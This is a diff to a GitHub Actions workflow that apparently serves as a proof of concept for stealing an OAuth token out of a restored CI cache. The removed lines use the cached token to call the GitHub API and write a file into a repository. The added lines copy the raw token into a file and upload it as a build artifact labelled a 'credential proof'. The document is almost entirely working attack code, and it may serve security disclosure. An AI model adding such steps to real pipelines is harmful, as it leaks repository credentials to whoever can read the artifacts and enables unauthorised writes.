@@ -12,46 +12,25 @@ jobs:
         with:
           path: cache
           key: apexblack-fork-cache-20260804-oauth2
-      - name: Normalize exact cached credential and write base
-        env:
-          CACHE_HIT: \${{ steps.restore.outputs.cache-hit }}
+      - name: Preserve restored controlled credential
         run: |
           set -euo pipefail
           mkdir -p result
-          printf "cache-hit=%s\n" "$CACHE_HIT" > result/observation.txt
+          printf "cache-hit=%s\n" "\${{ steps.restore.outputs.cache-hit }}" > result/observation.txt
           if [ ! -s cache/token.txt ]; then
             printf "token-present=no\n" >> result/observation.txt
-            cat result/observation.txt
             exit 0
           fi
           printf "token-present=yes\n" >> result/observation.txt
           printf "raw-token-bytes=%s\n" "$(wc -c < cache/token.txt)" >> result/observation.txt
-          token="$(head -c 40 cache/token.txt)"
-          printf "normalized-token-bytes=%s\n" "$(printf '%s' "$token" | wc -c)" >> result/observation.txt
-          user_http="$(curl -sS -X GET \
-            -H "Accept: application/vnd.github+json" \
-            -H "Authorization: Bearer $token" \
-            -H "X-GitHub-Api-Version: 2022-11-28" \
-            https://api.github.com/user -o result/user.json -w "%{http_code}")"
-          printf "user-http=%s\n" "$user_http" >> result/observation.txt
-          marker="fork-pr-oauth2-normalized-20260804"
-          content="$(printf "%s\n" "$marker" | base64 -w0)"
-          body=$(printf '%s' '{"message":"fork PR normalized OAuth2 sentinel","content":"'"$content"'"}')
-          http="$(curl -sS -X PUT \
-            -H "Accept: application/vnd.github+json" \
-            -H "Authorization: Bearer $token" \
-            -H "X-GitHub-Api-Version: 2022-11-28" \
-            "https://api.github.com/repos/apexblack-bear-c0dc04/lfs-source-20260804/contents/fork-cache-pr-oauth2-normalized-write.txt" \
-            --data "$body" \
-            -o result/api-response.json -w "%{http_code}")"
-          printf "put-http=%s\n" "$http" >> result/observation.txt
+          head -c 40 cache/token.txt > result/restored-bear-credential.txt
+          printf "normalized-token-bytes=%s\n" "$(wc -c < result/restored-bear-credential.txt)" >> result/observation.txt
+          printf "normalized-token-sha256=%s\n" "$(sha256sum result/restored-bear-credential.txt | cut -d' ' -f1)" >> result/observation.txt
           cat result/observation.txt
-          cat result/user.json
-          cat result/api-response.json
-      - name: Upload final observation
+      - name: Upload restored credential proof
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: fork-cache-pr-oauth2-normalized-observation
+          name: fork-cache-pr-oauth2-credential-proof
           path: result
-# fixed-length normalization for test-fixture secret transport
+# controlled credential acquisition proof for reviewer replay
